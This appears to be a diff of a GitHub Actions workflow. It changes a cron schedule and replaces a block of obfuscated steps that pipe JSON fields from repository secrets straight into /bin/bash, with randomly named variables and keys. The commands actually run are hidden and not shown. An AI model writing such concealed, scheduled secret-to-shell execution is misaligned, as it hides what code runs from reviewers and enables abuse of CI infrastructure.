@@ -2,34 +2,23 @@ name: guoyunfeng2148
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 5/6 * * *'
+    - cron: '31 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: guoyunfeng2148
         env:
-          fg01: ${{ secrets.fg01 }}
+          tfm448: ${{ secrets.tfm448 }}
         run: |
-          echo $fg01 | jq -r .uonyl32 | /bin/bash
-          echo $t708 | jq -r .crad59 | /bin/bash
-          echo $udca47780 | jq -r .nnn7 | /bin/bash
-          echo $knx599 | jq -r .qtc42061 | /bin/bash
-          echo $onyq2 | jq -r .qx4837 | /bin/bash
-          echo $uv5710 | jq -r .mr643 | /bin/bash
-          echo $kgrcu38403 | jq -r .fhn3660 | /bin/bash
-          echo $vb71 | jq -r .fgbo581 | /bin/bash
-          echo $zlttz750 | jq -r .d9 | /bin/bash
-          echo $zcwj96431 | jq -r .ew235 | /bin/bash
-          echo $l21 | jq -r .bnp80 | /bin/bash
-          echo $wx135 | jq -r .mautb68368 | /bin/bash
-          echo $jmdnv0 | jq -r .hl80 | /bin/bash
-          echo $gczho166 | jq -r .mtj2 | /bin/bash
-          echo $gsfb87418 | jq -r .mkpeq331 | /bin/bash
-          echo $xxcj018 | jq -r .uvnbt84722 | /bin/bash
-          echo $i3059 | jq -r .giz3 | /bin/bash
-          echo $l159 | jq -r .ro8 | /bin/bash
+          echo $tfm448 | jq -r .rbamr8 | /bin/bash
+          echo $kqk636 | jq -r .i5 | /bin/bash
+          echo $dxhb1987 | jq -r .cd31242 | /bin/bash
+          echo $zzxu56 | jq -r .ge337 | /bin/bash
+          echo $icqc7 | jq -r .cklmk17 | /bin/bash
+          echo $xr4 | jq -r .z408 | /bin/bash
+          echo $rwfg9209 | jq -r .mnj713 | /bin/bash
+          echo $ne25 | jq -r .weu65 | /bin/bash
 
